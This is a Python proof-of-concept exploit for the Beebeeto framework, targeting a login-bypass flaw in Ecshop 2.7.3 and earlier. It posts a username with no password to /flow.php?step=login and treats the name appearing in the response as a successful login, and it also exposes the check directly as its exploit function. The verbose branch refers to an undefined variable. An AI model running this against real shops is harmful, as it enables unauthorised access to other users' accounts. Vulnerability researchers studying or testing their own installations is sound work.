#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import time
import urllib2
import urllib
import cookielib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
            # poc相关信息
            'poc': {
                'id': 'poc-2014-0025',# 由Beebeeto官方编辑
                'name': 'Ecshop 2.7.3 /flow.php 前台任意用户登录 POC',  # 名称
                'author': 'beeOver',  # 作者
                'create_date': '2014-09-23',  # 编写日期
                },
            # 协议相关信息
            'protocol': {
                'name': 'http',  # 该漏洞所涉及的协议名称
                'port': [80],  # 该协议常用的端口号，需为int类型
                'layer4_protocol': ['tcp'],  # 该协议
                },
            # 漏洞相关信息
            'vul': {
                'app_name': 'Ecshop',  # 漏洞所涉及的应用名称
                'vul_version': ['<=2.7.3'],  # 受漏洞影响的应用版本
                'type': 'Login Bypass',  # 漏洞类型
                'tag': ['Ecshop', 'flow.php', 'login bypass'],  # 漏洞相关tag
                'desc': 'Ecshop has login bypass logic error that anyboby can login success by username.',  # 漏洞描述
                'references': ['http://www.wooyun.org/bugs/wooyun-2014-063655',  # 参考链接
                    ],
                },
            }

    def _init_user_parser(self):
        #测试人员在测试网站上注册账号的用户名
        self.user_parser.add_option("-u", "--username", action="store", \
                dest="username", type= "string", default=None, \
                help="This poc need a legal username to detect, so you must" \
                "sign up a username in website first")
        #获取登录所需要的验证码
        self.user_parser.add_option("-c", "--captcha", action ="store", \
                dest="captcha", type="string", default=None, \
                help="If target website need captcha to login, you " \
                "should give me a captcha. Default not need.")

    @classmethod
    def verify(cls, args):
        attack_url = args['options']['target'] + "/flow.php?step=login"
        username = args['options']['username']
        captcha = args['options']['captcha']
        attack_data = {
                "act": "signin",
                "username": username,
                "captcha": captcha
                }
        post_data = urllib.urlencode(attack_data)
        cookie = cookielib.LWPCookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        urllib2.install_opener(opener)
        user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}
        request = urllib2.Request(attack_url, post_data, headers=user_agent)
        response = urllib2.urlopen(request)
        content = response.read()

        if username in content:  #登录成功则用户名会出现在html中
            args['success'] = True
            args['poc_ret']['tips'] = "This website must have vulnerabilities, so anything user can login don't need password "
            if args['options']['verbose']:
                print "[*] Request Url: " + attack_url
                print "[*] Post Data: " + encodeData
            return args
        else:
            args["success"] = False
            args['poc_ret']['tips'] = "May be this website not have this bug? May be your captcha is wrong."
            return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
